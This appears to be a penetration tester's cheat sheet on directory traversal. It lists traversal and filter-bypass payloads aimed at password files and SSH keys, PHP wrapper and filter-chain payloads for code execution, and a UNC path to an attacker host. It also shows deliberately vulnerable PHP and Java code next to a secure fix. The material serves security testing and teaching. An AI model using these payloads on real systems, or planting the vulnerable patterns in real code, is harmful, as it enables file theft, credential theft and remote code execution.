tactic: Initial Access

**Directory Traversal** is when an attacker manipulates file path inputs to access files outside the intended directory. Caused by unsanitized user input being concatenated directly into a file path on the server.

involves accessing files located _outside the document root directory_

```
Intended:   /var/www/images/ + profile.png  =  /var/www/images/profile.png

Traversal:  /var/www/images/ + ../../../../etc/passwd  =  /etc/passwd
```

Classic vulnerable code (PHP):
```php
$filename = $_GET['file'];
$filepath = "/path/to/documents/" . $filename;
if (file_exists($filepath)) {
    header("Content-Type: application/pdf");
    readfile($filepath);
}
```

Exploited with:
```
?file=../../../../config.php
?file=../../../../etc/passwd
```

---

## Injection Points

- `file`, `filename`, `path`, `page`, `template`, `doc`, `folder` query parameters
- File download and image loading endpoints
- `loadImage?filename=`, `download?file=`, `view?page=`
- Intercepted image requests in Burp Proxy, images that fail to load often use a `filename` parameter worth testing
- Include and require statements in PHP backends
- Log file viewers, report generators

---

## Checklist

### Detection

- [ ]  Turn on Burp Intercept and check all image and file load requests for filename parameters
- [ ]  Submit a basic traversal and check if file contents are returned:

```
	?file=../../../../etc/passwd
	?filename=../../../etc/passwd
```

- [ ]  On Windows targets, try both slash styles:

```
	?file=..\..\..\windows\win.ini
	?file=../../../windows/win.ini
```

### Bypass Techniques

**Absolute path, when app treats input as relative to a root:**

```
?file=/etc/passwd
?file=/windows/win.ini
```

**Stripped traversal sequences, use nested sequences that survive stripping:**

```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
```

**URL encoded traversal:**

```
..%2f..%2f..%2fetc/passwd
```

**Double URL encoded, bypasses WAF or filters that decode once:**

```
..%252f..%252f..%252fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

**Absolute path prefix, app validates start of path but doesn't sanitize rest:**

```
/var/www/images/../../../etc/passwd
```

**Null byte, tricks extension validation by terminating the string before the appended extension:**

```
../../../etc/passwd%00.png
../../../etc/passwd%00.jpg
```

**Windows UNC path:**

```
\\attacker.com\share\file
```

**PHP wrappers, when you fully control a `require` or `include` parameter:**

```
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=expect://id
```

**PHP filter chain for RCE without file upload:**

bash

```bash
python php_filter_chain_generator.py --chain '<?=`$_GET[0]`; ?>' | tail -n 1 | urlencode
```

Pass the generated chain as the `page` parameter, then call `?page=<chain>&0=id`

---

## Target Files

**Linux:**

```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/home/user/.ssh/id_rsa
/root/.ssh/id_rsa
```

**Windows:**

```
\windows\win.ini
\windows\system32\drivers\etc\hosts
\inetpub\wwwroot\web.config
\users\administrator\desktop\root.txt
```

---

## White Box Testing

**Vulnerable, user input concatenated directly into file path:**

```java
@GetMapping("/download")
public ResponseEntity<byte[]> download(@RequestParam String filename) throws IOException {
    // no sanitization, attacker controls the full path
    Path filePath = Paths.get("/var/www/files/").resolve(filename);
    byte[] content = Files.readAllBytes(filePath);
    return ResponseEntity.ok(content);
}
```

**Vulnerable, path resolved but not validated to stay within base directory:**

```java
@GetMapping("/image")
public ResponseEntity<byte[]> loadImage(@RequestParam String filename) throws IOException {
    File file = new File("/var/www/images/" + filename);
    // file.exists() is checked but path is never normalised
    if (file.exists()) {
        return ResponseEntity.ok(Files.readAllBytes(file.toPath()));
    }
    return ResponseEntity.notFound().build();
}
```

**Vulnerable, extension check present but null byte bypass possible in older runtimes:**

```java
@GetMapping("/view")
public ResponseEntity<byte[]> view(@RequestParam String filename) throws IOException {
    if (!filename.endsWith(".pdf")) {
        return ResponseEntity.badRequest().build();
    }
    // attacker sends filename=../../etc/passwd%00.pdf
    Path path = Paths.get("/docs/").resolve(filename);
    return ResponseEntity.ok(Files.readAllBytes(path));
}
```

**Secure:**

```java
@GetMapping("/download")
public ResponseEntity<byte[]> download(@RequestParam String filename) throws IOException {
    Path baseDir = Paths.get("/var/www/files/").toRealPath();

    // normalize resolves ../ sequences, toRealPath resolves symlinks
    Path filePath = baseDir.resolve(filename).normalize().toRealPath();

    // confirm the resolved path is still within the base directory
    if (!filePath.startsWith(baseDir)) {
        return ResponseEntity.status(403).body(null);
    }

    // optional, whitelist allowed extensions
    String ext = filePath.toString().substring(filePath.toString().lastIndexOf('.'));
    if (!Set.of(".pdf", ".png", ".jpg").contains(ext)) {
        return ResponseEntity.badRequest().build();
    }

    return ResponseEntity.ok(Files.readAllBytes(filePath));
}
```

---

## Resources

- [PortSwigger Directory Traversal](https://portswigger.net/web-security/file-path-traversal)
- [HackTricks Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)